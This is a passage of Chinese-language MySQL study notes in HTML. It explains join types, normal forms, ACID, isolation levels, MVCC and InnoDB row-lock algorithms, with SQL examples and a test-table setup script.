<li>左外连接还返回左表中不符合连接条件单符合查询条件的数据行。</li>
<li>右外连接还返回右表中不符合连接条件单符合查询条件的数据行。</li>
<li>全外连接还返回左表中不符合连接条件单符合查询条件的数据行，并且还返回右表中不符合连接条件单符合查询条件的数据行。全外连接实际是上左外连接和右外连接的数学合集（去掉重复），即“全外&#x3D;左外 UNION 右外”。在MySQL中不支持全外连接，可以用“左外 UNION 右外”实现全外连接。</li>
</ul>
<h3 id="联合连接（UNION-JOIN）"><a href="#联合连接（UNION-JOIN）" class="headerlink" title="联合连接（UNION JOIN）"></a>联合连接（UNION JOIN）</h3><p>这是一种很少见的连接方式。Oracle、MySQL均不支持，其作用是：找出全外连接和内连接之间差异的所有行。这在数据分析中排错中比较常用。也可以利用数据库的集合操作来实现此功能。</p>
<h3 id="自然连接（NATURAL-INNER-JOIN）"><a href="#自然连接（NATURAL-INNER-JOIN）" class="headerlink" title="自然连接（NATURAL INNER JOIN）"></a>自然连接（NATURAL INNER JOIN）</h3><p>自然连接无需指定连接列，SQL会检查两个表中是否相同名称的列，且假设他们在连接条件中使用，并且在连接条件中仅包含一个连接列。</p>
<p>MySQL环境下：不允许使用ON语句，允许指定显式列。自然连接分为内外之分。内：NATURAL JOIN（不能加INNER）。外：NATURAL LEFT JOIN和NATURAL RIGHT JOIN。</p>
<p>ORACLE环境下：不允许使用ON语句，不允许指定显式列，显式列只能用*表示。对于每种连接类型（除了交叉连接外），均可指定NATURAL。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># 如果两张表都有name，age字段，相当于如下语句，但是必须写a.name,a.age</span><br><span class="line"><span class="keyword">select</span> a.name,a.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># 如果两张表都有name，age字段，相当于如下语句，但是必须写a.name,a.age</span><br><span class="line"><span class="keyword">select</span> a.name,a.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> name,age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a <span class="keyword">natural</span> <span class="keyword">right</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b</span><br><span class="line"># 如果两张表都有name，age字段，相当于如下语句，但是必须写b.name,b.age</span><br><span class="line"><span class="keyword">select</span> b.name,b.age <span class="keyword">from</span> `test_table` <span class="keyword">as</span> a  <span class="keyword">right</span> <span class="keyword">join</span> `<span class="keyword">user</span>` <span class="keyword">as</span> b <span class="keyword">on</span> a.name <span class="operator">=</span> b.name <span class="keyword">and</span> a.age <span class="operator">=</span> b.age</span><br></pre></td></tr></table></figure>

<h2 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h2><p>主表中没有的数据值，在副表中是不可以使用的。主表中的记录被副表引用，是不可以被删除的</p>
<h2 id="三大范式"><a href="#三大范式" class="headerlink" title="三大范式"></a>三大范式</h2><p><a href="https://zhuanlan.zhihu.com/p/20028672">https://zhuanlan.zhihu.com/p/20028672</a> </p>
<h3 id="第一范式（列不可分）"><a href="#第一范式（列不可分）" class="headerlink" title="第一范式（列不可分）"></a>第一范式（列不可分）</h3><p>定义：数据库表的每一列都是不可分割的原子数据项，而不能是集合，数组，记录等非原子数据项。如果实体中的某个属性有多个值时，必须拆分为不同的属性。</p>
<p><strong>1NF是所有关系型数据库的最基本要求</strong>，你在关系型数据库管理系统（RDBMS），例如SQL Server，Oracle，MySQL中创建数据表的时候，如果数据表的设计不符合这个最基本的要求，那么操作一定是不能成功的。</p>
<p>例如：</p>
<p>不满足第一范式</p>
<table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>班级</th>
</tr>
</thead>
<tbody><tr>
<td>0001</td>
<td>小红</td>
<td>高三1班</td>
</tr>
</tbody></table>
<p>改成</p>
<table>
<thead>
<tr>
<th>学号</th>
<th>姓名</th>
<th>年级</th>
<th>班级</th>
</tr>
</thead>
<tbody><tr>
<td>0001</td>
<td>小红</td>
<td>高三</td>
<td>1班</td>
</tr>
</tbody></table>
<h3 id="第二范式（属性完全依赖于主键）"><a href="#第二范式（属性完全依赖于主键）" class="headerlink" title="第二范式（属性完全依赖于主键）"></a>第二范式（属性完全依赖于主键）</h3><p>定义：满足第一范式前提， 当存在联合主键的时候，才会发生不符合第二范式的情况。比如有两个属性的联合主键，如果存在这样的属性，它只依赖于联合主键中的一个属性而不依赖另一个，这就是不符合第二范式的。</p>
<p>仅仅符合1NF的设计，仍然会存在数据冗余过大，插入异常，删除异常，修改异常的问题，例如：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151849658.jpg" alt="img"></p>
<p>注１：根据三种关系完整性约束中实体完整性的要求，关系中的码（注２）所包含的任意一个属性都不能为空，所有属性的组合也不能重复。为了满足此要求，图中的表，只能将学号与课名的组合作为码，否则就无法唯一地区分每一条记录。</p>
<p>注２：码：关系中的某个属性或者某几个属性的组合，用于区分每个元组（可以把“元组”理解为一张表中的每条记录，也就是每一行）。</p>
<ol>
<li>每一名学生的学号、姓名、系名、系主任这些数据重复多次。每个系与对应的系主任的数据也重复多次。——<strong>数据冗余过大</strong>。</li>
<li>假如学校新建了一个系，但是暂时还没有招收任何学生（比如3月份就新建了，但要等到8月份才招生），那么是无法将系名与系主任的数据单独地添加到数据表中去的 （注１）。——<strong>插入异常</strong>。</li>
<li>假如将某个系中所有学生相关的记录都删除，那么所有系与系主任的数据也就随之消失了（一个系所有学生都没有了，并不表示这个系就没有了）。——<strong>删除异常</strong>。</li>
<li>假如李勇转系到法律系，那么为了保证数据库中数据的一致性，需要修改三条记录中系与系主任的数据。——<strong>修改异常</strong>。</li>
</ol>
<p>修改后：</p>
<p>选课表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151854983.jpg" alt="img"></p>
<p>学生表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151854314.jpg" alt="img"></p>
<p>对于修改后的表：</p>
<ol>
<li>李小明转系到法律系<br>只需要修改一次李小明对应的系的值即可。——有改进</li>
<li>数据冗余是否减少了？<br>学生的姓名、系名与系主任，不再像之前一样重复那么多次了。——有改进</li>
<li>删除某个系中所有的学生记录<br>该系的信息仍然全部丢失。——无改进</li>
<li>插入一个尚无学生的新系的信息。<br>因为学生表的码是学号，不能为空，所以此操作不被允许。——无改进</li>
</ol>
<p>所以说，仅仅符合2NF的要求，很多情况下还是不够的，而出现问题的原因，在于仍然存在非主属性<strong>系主任</strong>对于码<strong>学号</strong>的传递函数依赖。为了能进一步解决这些问题，还需要将符合2NF要求的数据表改进为符合3NF的要求。</p>
<h3 id="第三范式（属性不能传递依赖于主键）"><a href="#第三范式（属性不能传递依赖于主键）" class="headerlink" title="第三范式（属性不能传递依赖于主键）"></a>第三范式（属性不能传递依赖于主键）</h3><p>定义：满足第二范式前提， 如果某一属性依赖于其他非主键属性，而其他非主键属性又依赖于主键，那么这个属性就是间接依赖于主键，这被称作传递依赖于主属性。</p>
<p>例如：</p>
<p>选课表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901434.jpg" alt="img"></p>
<p>学生表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901270.jpg" alt="img"></p>
<p>系表</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151901808.jpg" alt="img"></p>
<p>修改后：</p>
<ol>
<li>删除某个系中所有的学生记录<br>该系的信息不会丢失。——有改进</li>
<li>插入一个尚无学生的新系的信息。<br>因为系表与学生表目前是独立的两张表，所以不影响。——有改进</li>
<li>数据冗余更加少了。——有改进</li>
</ol>
<h3 id="BCNF范式"><a href="#BCNF范式" class="headerlink" title="BCNF范式"></a>BCNF范式</h3><p>要了解 BCNF 范式，那么先看这样一个问题：<br>若：</p>
<ol>
<li>某公司有若干个仓库；</li>
<li>每个仓库只能有一名管理员，一名管理员只能在一个仓库中工作；</li>
<li>一个仓库中可以存放多种物品，一种物品也可以存放在不同的仓库中。每种物品在每个仓库中都有对应的数量。</li>
</ol>
<p>那么关系模式仓库（仓库名，管理员，物品名，数量） 属于哪一级范式？</p>
<p>答：已知函数依赖集：仓库名 → 管理员，管理员 → 仓库名，（仓库名，物品名）→ 数量<br>码：（管理员，物品名），（仓库名，物品名）<br>主属性：仓库名、管理员、物品名<br>非主属性：数量<br>∵ 不存在非主属性对码的部分函数依赖和传递函数依赖。∴ 此关系模式属于3NF。</p>
<p>基于此关系模式的关系（具体的数据）可能如图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151906491.jpg" alt="img"></p>
<p>好，既然此关系模式已经属于了 3NF，那么这个关系模式是否存在问题呢？我们来看以下几种操作：</p>
<ol>
<li>先新增加一个仓库，但尚未存放任何物品，是否可以为该仓库指派管理员？——不可以，因为物品名也是主属性，根据实体完整性的要求，主属性不能为空。</li>
<li>某仓库被清空后，需要删除所有与这个仓库相关的物品存放记录，会带来什么问题？——仓库本身与管理员的信息也被随之删除了。</li>
<li>如果某仓库更换了管理员，会带来什么问题？——这个仓库有几条物品存放记录，就要修改多少次管理员信息。</li>
</ol>
<p>从这里我们可以得出结论，在某些特殊情况下，即使关系模式符合 3NF 的要求，仍然存在着插入异常，修改异常与删除异常的问题，仍然不是 ”好“ 的设计。</p>
<p>造成此问题的原因：存在着<strong>主属性</strong>对于码的部分函数依赖与传递函数依赖。（在此例中就是存在主属性【仓库名】对于码【（管理员，物品名）】的部分函数依赖。</p>
<p>解决办法就是要在 3NF 的基础上消除<strong>主属性</strong>对于码的部分与传递函数依赖。</p>
<p>仓库（仓库名，管理员）<br>库存（仓库名，物品名，数量）</p>
<p>这样，之前的插入异常，修改异常与删除异常的问题就被解决了。</p>
<h2 id="事务四大特性（ACID）"><a href="#事务四大特性（ACID）" class="headerlink" title="事务四大特性（ACID）"></a>事务四大特性（ACID）</h2><h3 id="事务的理解"><a href="#事务的理解" class="headerlink" title="事务的理解"></a>事务的理解</h3><p>事务的产生，是为了当应用程序访问数据库的时候，事务能够简化我们的编程模型，不需要我们去考虑各种各样的潜在错误和并发问题。当我们使用事务时，要么提交，要么回滚，不用考虑网络异常，服务器宕机了，同时更改一个数据这些情况。<strong>因此事务本质上是为了应用层服务的</strong>，而不是伴随着数据库系统天生就有的。</p>
<h4 id="数据库为什么要有事务？"><a href="#数据库为什么要有事务？" class="headerlink" title="数据库为什么要有事务？"></a>数据库为什么要有事务？</h4><p>为了保证数据的最终一致性。</p>
<h3 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h3><ul>
<li>原子性（Automicity）：满足原子操作单元，对数据的操作，要么全部执行，要么全部失败（通过undo log来保证）。</li>
<li>一致性（Consistency）： 应用系统从一个正确的状态到另一个正确的状态。而ACID就是说事务能够通过AID来保证这个C的过程。C是目的，AID都是手段。</li>
<li>隔离性（Isolation）： 事务之间时相互独立的，中间状态对外不可见。 隔离状态执行事务，使它们好像是系统在给定时间内执行的唯一操作。如果有两个事务，运行在相同的时间内，执行相同的功能，事务的隔离性将确保每一事务在系统中认为只有该事务在使用系统。这种属性有时称为串行化，为了防止事务操作间的混淆，必须串行化或序列化请求，使得在同一时间仅有一个请求用于同一数据。</li>
<li>持久性（Durability）： 数据的修改是永久的，即使数据库发生故障。</li>
</ul>
<h4 id="一致性的理解"><a href="#一致性的理解" class="headerlink" title="一致性的理解"></a>一致性的理解</h4><p>ACID里的AID都是数据库的特征，依赖数据库的具体实现。而这个C，它依赖于应用层，也就是依赖于开发者。这里的一致性是指系统从一个正确的状态，迁移到另一个正确的状态（当前的状态满足预定的约束）。事务具备ACID里C的特性是说通过事务的AID来保证一致性。</p>
<p>例如：</p>
<blockquote>
<p>我们提到保镖会说强壮、好功夫和踏实。这里强壮、好功夫和踏实都是保镖自己的特征，而安全是属于你的，而你通过保镖的特征来保护你的安全。</p>
</blockquote>
<p>我们能够通过AID保证我们的一致性，但事务本身没办法确保。用上面保镖的例子来说，你正常被保护一定是安全的，但是你故意骗保镖离开你身边，然后你自己溜出去玩就不安全了。同样，如果你在事务里故意写出违反约束的代码，比如在银行系统里定时每天给自己的账户打入100w，这个事务是没办法的。</p>
<p>例如：</p>
<blockquote>
<p>A要向B支付100元，而A的账户中只有90元，并且给定账户余额这一列的约束是不能小于0。那么这条事务执行会失败，因为90-100&#x3D;-10，小于给定的约束。</p>
</blockquote>
<p>这个例子里，支付之前数据库里的数据都是符合约束的，但是如果事务执行成功了，数据库的数据就破坏约束了，因此事务不能成功，事务提供了一致性的保证。</p>
<p>例如：</p>
<blockquote>
<p>A要向B支付100元，而A的账户中只有90元，账户余额列没有任何约束。但是业务上不允许账户余额小于0。因此支付完成后业务上会检查A的账户余额，发现余额小于0了，于是业务上进行了事务的回滚。</p>
</blockquote>
<p>这个例子里，如果事务执行成功，虽然没有破坏数据库的约束，但是破坏了应用层的约束。而事务的回滚保证了数据库的约束，因此也可以说事务提供了一致性保证（ps：事实上，是应用层利用事务回滚保证了约束不被破坏）。</p>
<p>例如：</p>
<blockquote>
<p>A要向B支付100元，而A的账户中只有90元，账户余额列没有任何约束。然后支付成功了。</p>
</blockquote>
<p>这个例子里，直观上账户余额为什么能为负呢？但这里事务执行前和执行后，系统没有任何的约束被破坏。一直都是保持正确的状态。</p>
<p>综上，可以理解一致性就是：应用系统从一个正确的状态到另一个正确的状态。而ACID就是说事务能够通过AID来保证这个C的过程。C是目的，AID都是手段。</p>
<h2 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h2><h3 id="并发出现的问题"><a href="#并发出现的问题" class="headerlink" title="并发出现的问题"></a>并发出现的问题</h3><ul>
<li>脏读（dirty read）： A事务还没提交，B事务就读到了A事务的结果。（破坏了隔离性）</li>
<li>丢失修改（Lost to modify）：事务1读取某表中的数据 A &#x3D; 20，事务2也读取 A &#x3D; 20，事务1修改A &#x3D; A - 1，事务2也修改 A &#x3D; A - 1，最终结果A&#x3D;19，事务1的修改丢失了。</li>
<li>不可重复读（Unrepeatableread）： 针对其提交前后，读取数据本身的对比。A事务在本次事物中，对自己未操作过的数据，进行了多次读取，结果出现了不一致情况。(破坏了一致性，update)</li>
<li>幻读（Phantom read）：针对其提交前后，读取数据条数的对比。同样一笔查询在整个事务过程中多次执行后，数据总量不一致。 A事务在本次事务中，对自己未操作过的数据，进行了多次读取，第一次读取时，数据总量100条，第二次读取时，数据总量200条。(破坏了一致性，delete)</li>
</ul>
<h3 id="解决方案-制定标准"><a href="#解决方案-制定标准" class="headerlink" title="解决方案(制定标准)"></a>解决方案(制定标准)</h3><p>读取未提交（READ-UNCOMMITTED）：最低的隔离级别，允许读取尚未提交的数据变更，可能会导致脏读、幻读或不可重复读。</p>
<p>读取已提交（READ-COMMITTED）：允许读取并发事务已经提交的数据，可以阻止脏读，但是幻读或不可重复读仍有可能发生。事务1在事务2提交前读取 A &#x3D; 20，在事务2提交后读取 A &#x3D; 19，不可重复读。 假设A刚开始不存在，事务1读取记录不存在，事务2提交后，事务1又读取到了A，幻读。</p>
<p>可重复读（REPEATABLE-READ）：对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，可以阻止脏读和不可重复读，但幻读仍有可能发生。假设 A 刚开始不存在，事务1读取记录不存在，事务2将A插入然后提交，事务1又读取到A，幻读。</p>
<p>可串行化（SERIALIZABLE）：最高的隔离级别，完全服从ACID的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，该级别可以防止脏读、不可重复读以及幻读。</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>READ-UNCOMMITTED</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>READ-COMMITTED</td>
<td>×</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>REPEATABLE-READ</td>
<td>×</td>
<td>×</td>
<td>√</td>
</tr>
<tr>
<td>SERIALIZABLE</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<h3 id="实现-Innodb"><a href="#实现-Innodb" class="headerlink" title="实现(Innodb)"></a>实现(Innodb)</h3><ul>
<li><p>锁机制：阻止其他事务对数据进行操作，各个隔离级别主要体现在读取数据时加的锁和释放时机。</p>
<ul>
<li>RU：事务读取的时候，不加锁。</li>
<li>RC：事务读取的时候加行级共享锁（读到才加锁，加锁后必须等其他事务提交后才会执行）， 一旦读完，立刻释放（并不是事务结束）。</li>
<li>RR：事务读取时加行级共享锁，直到事务结束才释放。</li>
<li>SE：事务读取时加表级共享锁，直到事务结束时才会释放。</li>
</ul>
</li>
<li><p>多版本并发控制（Multiversion Concurrency Control，MVCC）机制（Innodb默认开启）：生成一个数据快照，并用这个快照来提供一定级别的一致性的读取，也称为多版本数据控制。</p>
<ul>
<li>实际上就是CAS版本控制和读写分离的思想</li>
<li>主要作用于RC和RR级别</li>
</ul>
</li>
</ul>
<h2 id="MyISAM和InnoDB"><a href="#MyISAM和InnoDB" class="headerlink" title="MyISAM和InnoDB"></a>MyISAM和InnoDB</h2><p>如果某个进程想要获取读锁，同时另外一个进程想要获取写锁。在MySQL中，写锁是优先于读锁的。写锁和读锁优先级的问题是可以通过参数调节的：max_write_lock_count和low-priority-updates。</p>
<h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><ul>
<li>MYISAM表级锁</li>
<li>不支持事务</li>
<li>不支持外键</li>
<li>不支持数据库异常崩溃后的安全恢复</li>
<li>不支持MVCC</li>
</ul>
<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><ul>
<li><p>InnoDB只有通过索引条件检索数据才使用行级锁，否则，InnoDB使用表锁。也就是说，InnoDB的行锁是基于索引的。</p>
</li>
<li><p>Innodb支持行锁和表锁，默认为行级锁。 </p>
</li>
<li><p>支持事务，并且具有提交（commit）和回滚（rollback）事务的能力。</p>
</li>
<li><p>支持外键（不建议使用）。</p>
</li>
<li><p>支持数据库异常崩溃后的安全恢复，发生异常崩溃后，数据库重新启动的时候会保证数据库恢复到崩溃前的状态，这个恢复依赖于redo log。</p>
</li>
<li><p>支持MVCC，MVCC可以看作是行级锁的一个升级，可以有效减少加锁操作，提升性能。</p>
</li>
<li><p>在分布式事务的情况下一般会用到SERIALIZABLE（可串性化）隔离级别。</p>
</li>
<li><p>MySQL InnoDB引擎使用redo log保证事务的持久性，使用undo log来保证事务的原子性。</p>
</li>
<li><p>MySQL InnoDB引擎通过锁机制、MVCC等手段来保证事务的隔离性（默认的隔离级别是REPEARTABLE-READ）。</p>
</li>
</ul>
<h3 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a><a href="https://blog.csdn.net/whoamiyang/article/details/51901888?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&dist_request_id=1331645.10885.16183849906828127&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">MVCC</a></h3><p>读不加锁，读写不冲突。大多数情况下可以代替行级锁。</p>
<p>MVCC是通过在每行记录后面保存两个隐藏的列来实现。这两个列，一个保存了行的创建时间，一个保存行的过期时间（或删除时间）。 当然存储的并不是实际的时间值，而是系统版本号。每开始一个新的事务，系统版本号都会自动递增。事务开始时刻的系统版本号会作为事务的版本号，用来和查询到的每行记录的版本号进行比较。</p>
<p>在REPEATABLE READ隔离级别下，MVCC具体操作如下：</p>
<ol>
<li>SELECT</li>
</ol>
<p>InnoDB会根据以下两个条件检查每行记录：</p>
<ul>
<li><p>InnoDB只会查找版本早于当前事务版本的数据行（也就是，行的系统版本号小于或等于事务的系统版本号），这样可以确保事务读取的行要么是在事务开始前已经存在的，要么是事务自身插入或者修改过的。</p>
</li>
<li><p>行的删除版本号要么未定义，要么大于当前事务版本号，这可以确保事务读取到的行，在事务开始之前未被删除。</p>
</li>
</ul>
<p>只有同时满足的记录，才能返回作为查询结果。</p>
<p>MVCC可以解决这种场景的幻读问题，例如事务1的事务版本号ñ为1， 事务2的事务版本号为2。事务2第一次查询是有100条记录， 然后事务1添加了100条数据，这些数据的版本号是当前系统版本号（假设为3），此时事务2再去查询的话也只能查询出100条数据，因为当前系统版本号（3）大于事务2的事务版本号（2）。</p>
<ol start="2">
<li>INSERT</li>
</ol>
<p>InnoDB为新插入的每一行保存当前系统版本号（注意不是事务版本号）作为版本号。</p>
<ol start="3">
<li>DELETE</li>
</ol>
<p>InnoDB会为删除的每一行保存当前系统的版本号（注意不是事务版本号）作为删除标识.</p>
<ol start="4">
<li>UPDATE</li>
</ol>
<p>InnoDB执行UPDATE，实际上是新插入了一行记录，并保存其创建时间为当前系统版本号（注意不是事务版本号），同时保存当前系统版本号到要UPDATE的行的删除时间。</p>
<h3 id="InnoDB-存储引擎中行锁的三种算法"><a href="#InnoDB-存储引擎中行锁的三种算法" class="headerlink" title="InnoDB 存储引擎中行锁的三种算法"></a>InnoDB 存储引擎中行锁的三种算法</h3><h4 id="记录锁（Record-lock）"><a href="#记录锁（Record-lock）" class="headerlink" title="记录锁（Record lock）"></a>记录锁（Record lock）</h4><p>记录锁就是为某行记录加锁，基于唯一索引，事实上，它封锁的是该行的索引记录。如果表在建立的时候没有设置任何一个索引，那么 InnoDB 存储引擎会使用 “隐式的主键” 来进行锁定。</p>
<p>隐式的主键就是指：如果在建表的时候没有指定主键，InnoDB 存储引擎会将第一列非空的列作为主键；如果没有的话会自动生成一列为 6 字节的主键。</p>
<p>如果我们的 SQL 语句中的条件导致索引失效（比如使用 or） 或者说条件根本就不涉及索引或者主键，行级锁就将退化为表锁。</p>
<h5 id="两条不同记录拥有相同的索引，会发生锁冲突吗？"><a href="#两条不同记录拥有相同的索引，会发生锁冲突吗？" class="headerlink" title="两条不同记录拥有相同的索引，会发生锁冲突吗？"></a>两条不同记录拥有相同的索引，会发生锁冲突吗？</h5><p>行锁锁住的是索引，而不是一条记录（只不过我们平常这么说锁住了哪条记录，比较好理解罢了）。所以如果两个事务分别操作的两条不同记录拥有相同的索引，某个事务会因为行锁被另一个事务占用而发生等待。例如两条记录里年龄字段都为20，年龄字段有索引。</p>
<h4 id="间隙锁（Gap-Lock）"><a href="#间隙锁（Gap-Lock）" class="headerlink" title="间隙锁（Gap Lock）"></a>间隙锁（Gap Lock）</h4><p>基于非唯一索引，锁定一个范围，不包括记录本身。 在可重复读提交下为了解决幻读问题时引入的锁机制。 </p>
<p>Gap Lock 和 Next-Key Lock 锁定的都是一段范围内的索引记录：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">10</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br></pre></td></tr></table></figure>

<p>对于上述 SQL 语句，所有在（1，10）区间内（左开右开）的记录行都会被 Gap Lock 锁住，所有 id 为 2、3、4、5、6、7、8、9 的数据行的插入会被阻塞，但是 1 和 10 两条被操作的索引记录并不会被锁住。</p>
<h4 id="临键锁（Next-key-lock）"><a href="#临键锁（Next-key-lock）" class="headerlink" title="临键锁（Next-key lock）"></a>临键锁（Next-key lock）</h4><p>基于非唯一索引，行锁和间隙锁的组合，锁定一个范围，包含记录本身。 对于行查询，都是采用该方法，主要目的是为了解决幻读问题。</p>
<p>例如一个索引有 10，11，13 和 20 这四个值，分别对这个 4 个索引进行加锁操作，那么这四个操作分别对应的 Next-Key Lock 锁住的区间是：</p>
<ul>
<li>(-∞, 10]</li>
<li>(10, 11]</li>
<li>(11, 13]</li>
<li>(13, 20]</li>
<li>(20, +∞]</li>
</ul>
<p>和 Gap Lock 的不同之处就在于，Next-Key Lock 锁定的区间是左开右闭的，也就是说它是包含当前被操作的索引记录的。</p>
<p>在 InnoDB 默认的隔离级别 REPEATABLE-READ 下，行锁默认使用的算法就是 Next-Key Lock。但是，如果操作的索引是唯一索引或主键，InnoDB 会对 Next-Key Lock 进行优化，将其降级为 Record Lock，即仅锁住索引本身，而不是范围。</p>
<p>由于主键也是一种唯一索引，所以我们可以这么说：Record Lock 是基于唯一索引的，而 Next-Key Lock 是基于非唯一索引的。</p>
<p>需要注意的，当操作的索引为非唯一索引时，InnoDB 会先用 Record Lock 锁住对应的唯一索引，再用 Next-Key Lock 和 Gap Lock 对这个非唯一索引进行处理，而不仅仅是锁住这个非唯一索引。</p>
<p>Next-Key Lock 降级为 Record Lock 仅存在于操作所有的唯一索引列的情况。若唯一索引由多个列组成，而操作的仅是多个唯一索引列中的其中一个，那么 InnoDB 存储引擎依然使用 Next-Key Lock 进行锁定。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> `test`;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE `test`;</span><br><span class="line"></span><br><span class="line">USE `test`;</span><br><span class="line"><span class="keyword">SET</span> NAMES utf8mb4;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for test</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `test`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `test` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `user_name` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `class` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  KEY `index_class` (`class`) <span class="keyword">USING</span> BTREE COMMENT <span class="string">&#x27;非唯一索引&#x27;</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of test</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">101</span>, <span class="string">&#x27;one&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">103</span>, <span class="string">&#x27;two&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">105</span>, <span class="string">&#x27;three&#x27;</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">107</span>, <span class="string">&#x27;four&#x27;</span>, <span class="number">6</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">110</span>, <span class="string">&#x27;five&#x27;</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">120</span>, <span class="string">&#x27;five&#x27;</span>, <span class="number">88</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">150</span>, <span class="string">&#x27;150&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">180</span>, <span class="string">&#x27;180&#x27;</span>, <span class="number">180</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span 